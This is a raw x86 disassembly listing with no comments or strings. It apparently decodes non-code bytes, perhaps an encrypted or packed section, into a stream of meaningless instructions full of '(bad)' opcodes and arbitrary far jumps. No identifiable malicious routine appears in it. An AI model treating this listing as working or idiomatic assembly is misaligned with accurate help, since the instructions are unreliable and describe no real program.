  416b52:	mov    eax,ds:0xc607b9d2
  416b57:	cli    
  416b58:	xor    eax,0x83208a47
  416b5d:	pop    es
  416b5e:	jno    0x416b45
  416b60:	add    bh,dh
  416b62:	stos   BYTE PTR es:[edi],al
  416b63:	mov    edx,0x57c48360
  416b68:	or     DWORD PTR [ebx],ecx
  416b6a:	inc    edi
  416b6b:	jl     0x416b81
  416b6d:	scas   al,BYTE PTR es:[edi]
  416b6e:	stos   DWORD PTR es:[edi],eax
  416b6f:	sub    DWORD PTR [ebx+ebx*2+0x6b940abe],edi
  416b76:	nop
  416b77:	(bad)  
  416b78:	cmp    al,0x89
  416b7a:	xchg   esp,eax
  416b7b:	mov    BYTE PTR [edx+edx*2-0x18df8353],al
  416b82:	cmp    BYTE PTR [edx-0x30fb684c],bh
  416b88:	xor    al,0x42
  416b8a:	mov    esp,0x28a62969
  416b8f:	mov    ds:0x24a05bf6,eax
  416b94:	(bad)  
  416b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b97:	sub    BYTE PTR [edi+0x73],al
  416b9a:	daa    
  416b9b:	mov    ebx,ds
  416b9d:	mov    cl,0xc8
  416b9f:	lahf   
  416ba0:	mov    ds:0x4b25aab,al
  416ba5:	jl     0x416b2d
  416ba7:	ffree  st(1)
  416ba9:	shl    BYTE PTR [ebx+0x2a],1
  416bac:	sbb    esp,DWORD PTR [ebx-0x51]
  416baf:	mov    ebx,0xed5e80c3
  416bb4:	lods   al,BYTE PTR ds:[esi]
  416bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bb6:	mov    esi,0x32f95f63
  416bbb:	xchg   edx,eax
  416bbc:	mov    ebx,0x536b057d
  416bc1:	xchg   DWORD PTR [esi-0x57],edi
  416bc4:	shl    ebx,cl
  416bc6:	das    
  416bc7:	loop   0x416b8b
  416bc9:	arpl   WORD PTR [edx-0xb],bx
  416bcc:	dec    ecx
  416bcd:	lods   eax,DWORD PTR ds:[esi]
  416bce:	outs   dx,BYTE PTR ds:[esi]
  416bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bd0:	xlat   BYTE PTR ds:[ebx]
  416bd1:	adc    al,0xad
  416bd3:	jmp    0x2914:0xdb066033
  416bda:	adc    bl,BYTE PTR [ebx+0x75e4296]
  416be0:	sub    cl,cl
  416be2:	test   DWORD PTR [ecx+0x8],esp
  416be5:	std    
  416be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416be7:	lds    esi,FWORD PTR [ebx-0x2cf49f90]
  416bed:	jmp    0x416bf2
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x145b70a9
  416c63:	mov    bh,0x1b
  416c65:	jae    0x416cce
  416c67:	cmc    
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	push   ebx
  416c6f:	pop    ds
  416c70:	mov    DWORD PTR [eax],0x95cb50a1
  416c76:	cld    
  416c77:	add    DWORD PTR [eax-0x469ccbfc],ecx
  416c7d:	pop    edx
  416c7e:	sub    al,0x99
  416c80:	add    dl,cl
  416c82:	add    eax,0x510f9df1
  416c87:	dec    esi
  416c88:	call   0x7ddfa311
  416c8d:	cmp    DWORD PTR [eax+ebx*8-0x71],ecx
  416c91:	mov    al,ds:0x4f1eb28
  416c96:	or     BYTE PTR [ecx-0x35],bh
  416c99:	or     DWORD PTR [edx-0x4402764b],ebx
  416c9f:	aas    
  416ca0:	repnz push ds
  416ca2:	icebp  
  416ca3:	mov    edx,0xbf5684fa
  416ca8:	jb     0x416c85
  416caa:	dec    eax
  416cab:	test   DWORD PTR [edx],ebx
  416cad:	cli    
  416cae:	daa    
  416caf:	pop    eax
  416cb0:	jnp    0x416c59
  416cb2:	popf   
  416cb3:	std    
  416cb4:	cmp    eax,0x1c793554
  416cb9:	in     al,dx
  416cba:	sbb    bl,0x15
  416cbd:	jbe    0x416caa
  416cbf:	mov    ch,BYTE PTR [ebx-0x42]
  416cc2:	pushf  
  416cc3:	frstor ds:0x171eabba
  416cc9:	add    al,BYTE PTR [edi]
  416ccb:	mov    WORD PTR [edi+0x2d8fcdd8],cs
  416cd1:	sub    esp,DWORD PTR [ecx+0x769abd75]
  416cd7:	nop
  416cd8:	imul   edx,esp,0xffffffd7
  416cdb:	xor    ebx,DWORD PTR [ebx+edi*1]
  416cde:	jns    0x416ca6
  416ce0:	test   ebx,esi
  416ce2:	xor    cl,BYTE PTR [ecx]
  416ce4:	sahf   
  416ce5:	push   edi
  416ce6:	rcl    DWORD PTR [ebx-0x7],0x5e
  416cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ceb:	inc    edi
  416cec:	add    DWORD PTR [edi+eax*4],0x56
  416cf0:	push   es
  416cf1:	jle    0x416ce1
  416cf3:	lea    ecx,[ebx-0x6687e95e]
  416cf9:	mov    ecx,ss
  416cfb:	jl     0x416d57
  416cfd:	ret    
  416cfe:	stos   BYTE PTR es:[edi],al
  416cff:	int    0x97
  416d01:	mov    esp,0xe01164d1
  416d06:	dec    ecx
  416d07:	dec    ebp
  416d08:	or     al,bh
  416d0a:	dec    ecx
  416d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d0c:	(bad)  
  416d0d:	sub    edx,DWORD PTR [eax+0x77]
  416d10:	jo     0x416d7c
  416d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d13:	sbb    al,0x10
  416d15:	jmp    DWORD PTR [edi+0xd]
  416d18:	pop    ebp
  416d19:	add    al,0x28
  416d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d1c:	mov    ecx,0xb9349248
  416d21:	push   ss
  416d22:	in     al,dx
  416d23:	pushf  
  416d24:	push   esi
  416d25:	mov    ds:0xf8bfaa79,eax
  416d2a:	ss xchg edi,eax
  416d2c:	or     DWORD PTR [edi+edx*1],ebp
  416d2f:	push   cs
  416d30:	je     0x416d0f
  416d32:	cli    
  416d33:	add    BYTE PTR [edi+edi*4],cl
  416d36:	xchg   esi,eax
  416d37:	xor    BYTE PTR [eax+0x2cf74c45],bh
  416d3d:	jp     0x416d7a
  416d3f:	pop    ss
  416d40:	out    0x1,eax
  416d42:	sbb    al,0xcf
  416d44:	jbe    0x416cc8
  416d46:	inc    ebx
  416d47:	dec    edx
  416d48:	gs sbb ch,dh
  416d4b:	push   es
  416d4c:	shl    DWORD PTR [esi+0x1a],1
  416d4f:	pop    esp
  416d50:	(bad)  
  416d51:	mov    ch,al
  416d53:	fild   WORD PTR [edx-0x2c]
  416d56:	sbb    ecx,DWORD PTR [edi]
  416d58:	retf   0x23f2
  416d5b:	and    DWORD PTR [edx],eax
  416d5d:	mov    dl,0x78
  416d5f:	aaa    
  416d60:	mov    eax,0xb4eb6526
  416d65:	mov    esi,0x27764b0c
  416d6a:	repz ja 0x416da4
  416d6d:	mov    al,ds:0x0
	...
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	and    ebx,DWORD PTR [ecx]
  416de4:	das    
  416de5:	dec    edi
  416de6:	test   BYTE PTR [bx+si],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	inc    BYTE PTR [ecx+0x416544be]
  416df4:	push   es
  416df5:	clc    
  416df6:	xchg   ecx,eax
  416df7:	sti    
  416df8:	push   ds
  416df9:	or     ch,BYTE PTR [eax+0x51]
  416dfc:	jmp    FWORD PTR [esi+0x23]
  416dff:	mov    bl,0x98
  416e01:	(bad)  
  416e02:	(bad)  
  416e04:	enter  0xe5aa,0x47
  416e08:	xor    DWORD PTR [ebx],esi
  416e0a:	fbstp  TBYTE PTR [ecx]
  416e0c:	std    
  416e0d:	xor    BYTE PTR [ebp+0x74679877],al
  416e13:	adc    al,BYTE PTR [edx+edx*1+0x7da043ed]
  416e1a:	adc    bl,ah
  416e1c:	push   0xffffffd4
  416e1e:	ret    0x8126
  416e21:	dec    ebx
  416e22:	nop
  416e23:	push   ecx
  416e24:	test   eax,0x4607e7dc
  416e29:	icebp  
  416e2a:	sub    eax,0xcba80c68
  416e2f:	jecxz  0x416df8
  416e31:	lds    ecx,FWORD PTR [edx+0xef3c5a2]
  416e37:	dec    esp
  416e38:	sbb    BYTE PTR [ebx+0x73],bh
  416e3b:	mov    bl,0x41
  416e3d:	push   ebp
  416e3e:	pushf  
  416e3f:	mov    ebx,DWORD PTR [esi]
  416e41:	xchg   DWORD PTR [ebx+0x47a2bd3d],edx
  416e47:	das    
  416e48:	mov    dl,0x6b
  416e4a:	jle    0x416e55
  416e4c:	pop    edi
  416e4d:	push   ecx
  416e4e:	push   edx
  416e4f:	pop    ss
  416e50:	pop    eax
  416e51:	retf   0x25c
  416e54:	mov    ebp,0xb7f45e6c
  416e59:	div    BYTE PTR [ebp+0x2ab68aac]
  416e5f:	retf   0xd3a7
  416e62:	stos   BYTE PTR es:[edi],al
  416e63:	outs   dx,BYTE PTR ds:[esi]
  416e64:	outs   dx,BYTE PTR ds:[esi]
  416e65:	data16 into 
  416e67:	lahf   
  416e68:	std    
  416e69:	jecxz  0x416e18
  416e6b:	pop    ebp
  416e6c:	enter  0xbde8,0x8d
  416e70:	and    eax,0x372fd14d
  416e75:	mov    dh,0x52
  416e77:	addr16 loop 0x416e1a
  416e7a:	and    al,BYTE PTR [edx]
  416e7c:	stc    
  416e7d:	nop
  416e7e:	cmp    eax,edi
  416e80:	inc    dh
  416e82:	jmp    0x416e56
  416e84:	sahf   
  416e85:	fs mov esi,0x4d9ed395
  416e8b:	addr16 in eax,0x2d
  416e8e:	and    bh,bl
  416e90:	aad    0x61
  416e92:	sbb    ch,ch
  416e94:	add    BYTE PTR [esp+edi*8+0x76e833a7],bh
  416e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e9c:	inc    ebp
  416e9d:	imul   ecx,DWORD PTR [esp+edi*2+0x1e],0xffffffab
  416ea2:	jno    0x416e9d
  416ea4:	pop    ds
  416ea5:	mov    ch,0x76
  416ea7:	inc    esi
  416ea8:	mov    ds:0x47c49c18,al
  416ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eae:	xchg   esi,eax
  416eaf:	cmp    DWORD PTR [eax+esi*1+0x21fc6912],0xe2a15c2a
  416eba:	jne    0x416ec3
  416ebc:	mov    ecx,DWORD PTR [edi]
  416ebe:	(bad)  
  416ec0:	test   al,0x21
  416ec2:	daa    
  416ec3:	pop    ecx
  416ec4:	and    DWORD PTR [eax+0x69],0x8cf9776d
  416ecb:	xchg   BYTE PTR [esi+eiz*8+0x524f1c07],ch
  416ed2:	jmp    0x416e83
  416ed4:	lea    eax,[eax]
  416ed6:	cld    
  416ed7:	call   0x364f9a2b
  416edc:	mov    ebp,0xb5e76e50
  416ee1:	aas    
  416ee2:	xor    DWORD PTR [ebx+0x7c16748],0x5f
  416ee9:	inc    esp
  416eea:	mov    edi,0x9cd28b
	...
  416f53:	add    BYTE PTR [eax],al
  416f55:	add    BYTE PTR [edi-0x519271e7],bh
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x68ad8eea
  416f64:	pop    esp
  416f65:	sbb    eax,0xf767
  416f6a:	add    BYTE PTR [ecx],al
  416f6c:	add    BYTE PTR [eax],al
  416f6e:	inc    esi
  416f6f:	dec    edx
  416f70:	lods   eax,DWORD PTR ds:[esi]
  416f71:	dec    edi
  416f72:	ins    DWORD PTR es:[edi],dx
  416f73:	push   eax
  416f74:	rcl    DWORD PTR [ebp+eiz*8+0x72],cl
  416f78:	(bad)  
  416f79:	mov    ah,0x98
  416f7b:	or     BYTE PTR [edi+0x7975d525],cl
  416f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f82:	mov    esp,0xbb393c14
  416f87:	mov    bh,0x3d
  416f89:	xor    DWORD PTR cs:[edi+0x1d],esp
  416f8d:	and    DWORD PTR [edx-0x11bec8fc],ebx
  416f93:	xchg   DWORD PTR [ebx-0x4a],eax
  416f96:	xchg   edi,eax
  416f97:	add    DWORD PTR [edx+0x78],esp
  416f9a:	fsubr  QWORD PTR [edi+0x1e]
  416f9d:	or     ecx,edi
  416f9f:	(bad)  [edi+0x63f69663]
  416fa5:	mov    esp,0x4750d3ef
  416faa:	cmp    eax,0x42115536
  416faf:	inc    esi
  416fb0:	push   edi
  416fb1:	push   edx
  416fb2:	sub    eax,0x94b9aec5
  416fb7:	or     bl,BYTE PTR [ebx+ebx*8+0x6b317875]
  416fbe:	js     0x416f60
  416fc0:	shl    DWORD PTR [edx-0x2],0x99
  416fc4:	fcom   DWORD PTR ds:0x687f7039
  416fca:	cmp    DWORD PTR [ecx-0x69b58545],edx
  416fd0:	push   edi
  416fd1:	addr16 or al,0x77
  416fd4:	sub    eax,0x329d7b28
  416fd9:	or     BYTE PTR [ebx-0x2d],cl
  416fdc:	jbe    0x41704c
  416fde:	mov    ah,0xd0
  416fe0:	rcr    DWORD PTR [edi+0x20],1
  416fe3:	or     ah,al
  416fe5:	dec    edi
  416fe6:	jge    0x416fc2
  416fe8:	imul   eax,DWORD PTR [ebp+0x77],0xffffff93
  416fec:	pop    edx
  416fed:	add    ecx,DWORD PTR [ecx+0x36e89777]
  416ff3:	imul   ebp,DWORD PTR [ebp+0x2c],0x21b606c7
  416ffa:	mov    esi,0xec48ef6c
  416fff:	shr    dh,cl
  417001:	jae    0x417025
  417003:	push   cs
  417004:	mov    bl,BYTE PTR [edx+eax*4+0x2cf5ebef]
  41700b:	sbb    DWORD PTR [eax],ecx
  41700d:	inc    ebx
  41700e:	add    BYTE PTR [eax+esi*2+0x2db01e9],ah
  417015:	jp     0x417074
  417017:	shr    DWORD PTR [esi+0x2ad80256],cl
  41701d:	dec    edi
  41701e:	retf   0x71de
  417021:	push   ebx
  417022:	sbb    edx,DWORD PTR [edx+ebx*4-0x47]
  417026:	jae    0x41704d
  417028:	aas    
  417029:	fsubr  st,st(5)
  41702b:	daa    
  41702c:	les    ebp,FWORD PTR [edx]
  41702e:	aam    0x85
  417030:	xor    al,0xb6
  417032:	jbe    0x417076
  417034:	pop    ebp
  417035:	aam    0x87
  417037:	das    
  417038:	jae    0x41707c
  41703a:	pop    ss
  41703b:	std    
  41703c:	mov    al,0xa7
  41703e:	cmc    
  41703f:	int    0x9b
  417041:	cmc    
  417042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417043:	push   0xffffffbd
  417045:	pop    eax
  417046:	popf   
  417047:	xchg   edi,eax
  417048:	dec    edi
  417049:	test   bl,al
  41704b:	push   esp
  41704c:	call   0xb1dd:0x998d2e01
  417053:	test   al,0x69
  417055:	mov    eax,ds:0xf115c35
  41705a:	mov    edx,0xe514b3dd
  41705f:	mov    dl,0x13
  417061:	mov    bh,0x62
  417063:	xchg   edi,eax
  417064:	xchg   esi,eax
  417065:	and    al,0xdc
  417067:	sti    
  417068:	shl    bl,1
  41706a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41706b:	stos   BYTE PTR es:[edi],al
  41706c:	pop    edi
  41706d:	lods   al,BYTE PTR ds:[esi]
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    ebx,DWORD PTR [edi-0x56]
  4170e4:	mov    eax,0xf867b9
  4170e9:	add    BYTE PTR [eax],al
  4170eb:	add    DWORD PTR [eax],eax
  4170ed:	add    BYTE PTR [ebp+0x3a],cl
  4170f0:	push   0xffffffbc
  4170f2:	das    
  4170f3:	scas   al,BYTE PTR es:[edi]
  4170f4:	cdq    
  4170f5:	or     ebp,ebp
  4170f7:	mov    esi,0xcf795d7e
  4170fc:	jns    0x4170eb
  4170fe:	shl    esi,1
  417100:	mov    ah,0xa6
  417102:	mov    ebx,0xf7f9ed49
  417107:	stc    
  417108:	sbb    eax,DWORD PTR [edi+0x42]
  41710b:	sahf   
  41710c:	aam    0x1a
  41710e:	(bad)  
  41710f:	mov    esi,0x39766a9a
  417114:	cmc    
  417115:	sbb    DWORD PTR [ebx+0x2e],eax
  417118:	ins    DWORD PTR es:[edi],dx
  417119:	cmp    ecx,0x21
  41711c:	fisubr DWORD PTR [edx]
  41711e:	in     al,dx
  41711f:	or     cl,BYTE PTR [ebx+eax*1]
  417122:	stc    
  417123:	pop    edi
  417124:	fwait
  417125:	push   0x0
  417127:	xchg   ebx,edx
  417129:	push   es
  41712a:	adc    DWORD PTR ds:0x757d8812,edx
  417130:	mov    eax,ss:0x9b660941
  417136:	dec    edx
  417137:	add    DWORD PTR [edx-0x3f0a3b51],0xffffffbc
  41713e:	push   ss
  41713f:	les    ebp,FWORD PTR [ecx+0x18]
  417142:	inc    esp
  417143:	jbe    0x417186
  417145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417146:	sahf   
  417147:	ret    
  417148:	call   0xc303:0x1825f86b
  41714f:	pop    eax
  417150:	call   0x707934fc
  417155:	and    ch,ch
  417157:	jecxz  0x41714e
  417159:	cdq    
  41715a:	js     0x4170f4
  41715c:	adc    DWORD PTR [edi-0x19ab4355],esi
  417162:	bound  eax,QWORD PTR [ecx+0x1bdcd5f5]
  417168:	cdq    
  417169:	dec    esi
  41716a:	int    0xb8
  41716c:	jg     0x4171d7
  41716e:	fldenv [ecx+0x480c207e]
  417174:	cmp    edi,esi
  417176:	add    al,BYTE PTR [edi-0x12]
  417179:	cli    
  41717a:	push   edx
  41717b:	ror    DWORD PTR [edx-0x13],0x63
  41717f:	mov    bl,0xec
  417181:	add    bl,bl
  417183:	ret    
  417184:	add    BYTE PTR [ebx-0x66],dh
  417187:	push   esp
  417188:	(bad)  
  417189:	in     al,0x40
  41718b:	fisttp WORD PTR [ebp-0x2a8b9a4c]
  417191:	idiv   BYTE PTR [edx+0x2458487c]
  417197:	dec    edi
  417198:	lds    esp,FWORD PTR [eax]
  41719a:	and    ah,BYTE PTR [edx]
  41719c:	mov    dl,0x21
  41719e:	(bad)  
  41719f:	adc    al,0xa9
  4171a1:	ja     0x417206
  4171a3:	fwait
  4171a4:	cmp    al,0x2e
  4171a6:	adc    al,0xa6
  4171a8:	dec    edi
  4171a9:	mov    ds:0xbf2a7be7,eax
  4171ae:	pop    ss
  4171af:	ins    DWORD PTR es:[edi],dx
  4171b0:	jae    0x4171f7
  4171b2:	xchg   BYTE PTR [eax],dl
  4171b4:	pushf  
  4171b5:	sbb    al,0xbe
  4171b7:	dec    eax
  4171b8:	mov    bh,0xa3
  4171ba:	mov    al,0xa8
  4171bc:	or     ebp,ebp
  4171be:	lea    cx,[eax+0x78]
  4171c2:	xchg   esi,eax
  4171c3:	int    0xe7
  4171c5:	sbb    al,BYTE PTR [edx+0x1e]
  4171c8:	ret    
  4171c9:	add    DWORD PTR [ecx-0x452e3895],esi
  4171cf:	mov    bl,0x49
  4171d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d2:	dec    esp
  4171d3:	cmp    esp,DWORD PTR [eax+ebp*2-0x27]
  4171d7:	mov    esp,0x302aabc2
  4171dc:	cmp    eax,0x179bc661
  4171e1:	cmp    al,0xe1
  4171e3:	mov    al,ds:0xe5074d51
  4171e8:	scas   al,BYTE PTR es:[edi]
  4171e9:	dec    esp
  4171ea:	xor    dh,BYTE PTR [ebp+0x70]
  4171ed:	pop    ds
	...
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    DWORD PTR [eax+0x1a],esi
  41725a:	(bad)  
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	xor    al,0x11
  417264:	ja     0x417248
  417266:	addr16 stc 
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	dec    edx
  41726f:	data16 xchg BYTE PTR [ecx+edx*1],bh
  417273:	sti    
  417274:	or     dl,bh
  417276:	or     eax,0x9c37ca7c
  41727b:	aad    0x15
  41727d:	imul   dl
  41727f:	fild   QWORD PTR [esi-0x693e864b]
  417285:	xchg   esi,eax
  417286:	ret    
  417287:	das    
  417288:	pop    ss
  417289:	leave  
  41728a:	call   0xead8:0xcafa68
  417291:	jge    0x417285
  417293:	xchg   edi,eax
  417294:	jmp    0x417258
  417296:	out    dx,eax
  417297:	fdivr  st,st(5)
  417299:	enter  0x4ed3,0xcb
  41729d:	outs   dx,DWORD PTR ds:[esi]
  41729e:	dec    eax
  41729f:	aas    
  4172a0:	imul   ebx,DWORD PTR [ecx+esi*1-0x3f],0x16876ff4
  4172a8:	ja     0x417244
  4172aa:	in     eax,dx
  4172ab:	ins    DWORD PTR es:[edi],dx
  4172ac:	push   edi
  4172ad:	jb     0x417230
  4172af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b0:	mov    edx,0x44247a11
  4172b5:	adc    DWORD PTR [edx],ecx
  4172b7:	mov    edx,ebx
  4172b9:	cmp    BYTE PTR [esi+eax*2-0x11],al
  4172bd:	imul   edx,ebx,0xeed318e2
  4172c3:	imul   eax,DWORD PTR [edx],0xc3913e10
  4172c9:	xchg   ebp,eax
  4172ca:	pop    ds
  4172cb:	push   ebx
  4172cc:	or     esp,edi
  4172ce:	into   
  4172cf:	mov    ebx,DWORD PTR [eax-0x4d4b1fbb]
  4172d5:	push   0x3b484d56
  4172da:	jo     0x41733a
  4172dc:	sbb    dh,BYTE PTR [edx]
  4172de:	nop
  4172df:	push   0xffffffbf
  4172e1:	test   eax,0x704e02bb
  4172e6:	and    dh,BYTE PTR gs:[eax+ecx*4]
  4172ea:	add    eax,0x3181bd8d
  4172ef:	mov    edi,DWORD PTR [eax]
  4172f1:	pop    eax
  4172f2:	xor    ebx,DWORD PTR [si+0x36]
  4172f6:	mov    al,0x9
  4172f8:	ror    DWORD PTR [edi+0x18],1
  4172fb:	cdq    
  4172fc:	jmp    0x4172ae
  4172fe:	pop    ss
  4172ff:	sub    eax,DWORD PTR [edi+0x38872f8c]
  417305:	ins    BYTE PTR es:[edi],dx
  417306:	xchg   ecx,eax
  417307:	add    cl,BYTE PTR [edx+edi*1-0x32d3e423]
  41730e:	test   ah,al
  417310:	lock jbe 0x41735d
  417313:	cld    
  417314:	shr    BYTE PTR [edi],0x0
  417317:	loop   0x4172a0
  417319:	mov    al,ds:0x7b762a94
  41731e:	iret   
  41731f:	popa   
  417320:	leave  
  417321:	(bad)  
  417322:	sub    eax,0xdcf3fcfb
  417327:	push   es
  417328:	fldcw  WORD PTR [ecx*8+0x67132019]
  41732f:	xchg   DWORD PTR [ebp+0x441df83e],eax
  417335:	cld    
  417336:	cld    
  417337:	mov    dl,0xfe
  417339:	sub    eax,0xb9ff2ee3
  41733e:	jae    0x4173ab
  417340:	push   ss
  417341:	pop    eax
  417342:	adc    eax,0xffea1b12
  417347:	xchg   ebx,eax
  417348:	dec    edi
  417349:	hlt    
  41734a:	jnp    0x41735b
  41734c:	int    0xe5
  41734e:	dec    ebx
  41734f:	pop    ecx
  417350:	dec    ecx
  417351:	cmp    DWORD PTR [eax+edx*1+0x50],0xfdd61376
  417359:	lds    esp,FWORD PTR [ecx]
  41735b:	sub    DWORD PTR [edx-0x5c270a6],ebx
  417361:	jmp    0xb1f3:0xfa911cb4
  417368:	in     eax,0x5d
  41736a:	(bad)  
  41736b:	and    al,0x2e
  41736d:	rol    BYTE PTR [eax],cl
	...
  4173d3:	add    BYTE PTR [eax],al
  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	or     BYTE PTR [esi+edi*4-0x50],dh
  4173e6:	addr16 cli 
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	nop
  4173ef:	adc    eax,0xbfa9ee81
  4173f4:	repnz in eax,0x99
  4173f7:	rcl    BYTE PTR [eax],cl
  4173f9:	out    0x1a,eax
  4173fb:	cmp    eax,0xe5382b2b
  417400:	xchg   esp,eax
  417401:	adc    DWORD PTR [ebx+0x7e],ebx
  417404:	inc    ecx
  417405:	retf   0x7d81
  417408:	jns    0x4173d8
  41740a:	sar    BYTE PTR [eax],cl
  41740c:	xchg   bh,bl
  41740e:	xchg   edi,eax
  41740f:	leave  
  417410:	cmp    DWORD PTR [edi+0x38],edx
  417413:	stos   DWORD PTR es:[edi],eax
  417414:	xchg   esp,eax
  417415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417416:	jecxz  0x417432
  417418:	(bad)  
  41741a:	xchg   edi,eax
  41741b:	jmp    0x81e6524
  417420:	scas   al,BYTE PTR es:[edi]
  417421:	mov    BYTE PTR [ecx+0x6f],cl
  417424:	xchg   esp,eax
  417425:	lods   eax,DWORD PTR ds:[esi]
  417426:	or     ah,dl
  417428:	mov    edx,0x43fea593
  41742d:	call   0x81f6f852
  417432:	push   ebx
  417433:	sub    edx,DWORD PTR [ebx]
  417435:	mov    ah,0x92
  417437:	adc    esi,ebp
  417439:	mov    esi,0x9112c9c3
  41743e:	fild   QWORD PTR [ebp-0x4b]
  417441:	or     BYTE PTR [ecx],bl
  417443:	mov    dl,ah
  417445:	mov    eax,gs:0x6473e2d
  41744b:	dec    ecx
  41744c:	fsub   DWORD PTR [ebx+0x17]
  41744f:	in     eax,dx
  417450:	pop    es
  417451:	mov    ds:0x54524940,eax
  417456:	pop    ebx
  417457:	sar    esp,1
  417459:	adc    BYTE PTR [eax-0x5e6fc881],ch
  41745f:	repz int3 
  417461:	fwait
  417462:	ins    DWORD PTR es:[edi],dx
  417463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417464:	and    dh,BYTE PTR [ecx+0x75]
  417467:	xchg   edi,eax
  417468:	sbb    esi,edx
  41746a:	sar    DWORD PTR [eax+0x77],cl
  41746d:	sub    BYTE PTR [eax-0x41],dh
  417470:	or     edx,DWORD PTR [esi-0x7a]
  417473:	fs dec ecx
  417475:	and    BYTE PTR [esi],bl
  417477:	sub    cl,BYTE PTR [eax-0x4b03dfcb]
  41747d:	inc    ebp
  41747e:	neg    dh
  417480:	in     eax,dx
  417481:	repz ss push esi
  417484:	mov    bh,0x4c
  417486:	adc    bh,ah
  417488:	fdivp  st(4),st
  41748a:	add    ebx,DWORD PTR [edi]
  41748c:	add    BYTE PTR ds:0xaa83b57d,0x95
  417493:	jmp    0x417489
  417495:	push   ebp
  417496:	aas    
  417497:	stos   BYTE PTR es:[edi],al
  417498:	mov    esp,0xa58d9274
  41749d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41749e:	jl     0x41745b
  4174a0:	adc    al,0x8b
  4174a2:	pusha  
  4174a3:	mov    esp,0xff50a435
  4174a8:	and    al,BYTE PTR [ecx-0x14]
  4174ab:	icebp  
  4174ac:	or     al,BYTE PTR [edi]
  4174ae:	sub    edi,DWORD PTR [eax+eax*2-0x5b]
  4174b2:	call   0x5271:0x3fe1f27a
  4174b9:	outs   dx,DWORD PTR ds:[esi]
  4174ba:	add    bh,al
  4174bc:	xor    ebx,0x396f6300
  4174c2:	test   al,0xc1
  4174c4:	dec    edx
  4174c5:	not    ecx
  4174c7:	mov    ?,WORD PTR [esi+ebx*2-0x59]
  4174cb:	add    BYTE PTR [esi+eax*8],bh
  4174ce:	rol    DWORD PTR [edx+0x63a723de],1
  4174d4:	push   esi
  4174d5:	xor    DWORD PTR [ecx+0x2f],0x12e2da19
  4174dc:	outs   dx,BYTE PTR ds:[esi]
  4174dd:	mov    eax,esp
  4174df:	mov    dl,0x42
  4174e1:	push   ebp
  4174e2:	mov    fs,WORD PTR [ebx]
  4174e4:	jmp    0xd7492184
  4174e9:	pop    ds
  4174ea:	ins    BYTE PTR es:[edi],dx
  4174eb:	mov    eax,0x6448
	...
  417554:	add    BYTE PTR [eax],al
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	push   0x3a
  417564:	fsubr  st,st(7)
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	jmp    0x4175ed
  417570:	jp     0x41759d
  417572:	sti    
  417573:	or     BYTE PTR [ebp+0x69],ch
  417576:	adc    al,0x80
  417578:	add    BYTE PTR [ecx],0x5c
  41757b:	lock lahf 
  41757d:	xchg   esi,eax
  41757e:	jmp    DWORD PTR [ebp+0x0]
  417581:	int    0xee
  417583:	add    DWORD PTR [esi+eiz*4],edx
  417586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417587:	xor    eax,0xbeb4aafc
  41758c:	pop    esi
  41758d:	jmp    0xf9fa:0x47f66827
  417594:	mov    ds:0x38aa0d12,eax
  417599:	push   esi
  41759a:	test   BYTE PTR [edx+edx*1],dh
  41759d:	fimul  DWORD PTR [esi]
  41759f:	sub    esi,ebp
  4175a1:	cmc    
  4175a2:	mov    WORD PTR [edi-0x2b256ec4],es
  4175a8:	mov    es,WORD PTR [edi-0x3]
  4175ab:	imul   ebp,DWORD PTR [esp+ebx*4-0x25],0xfbfb55e4
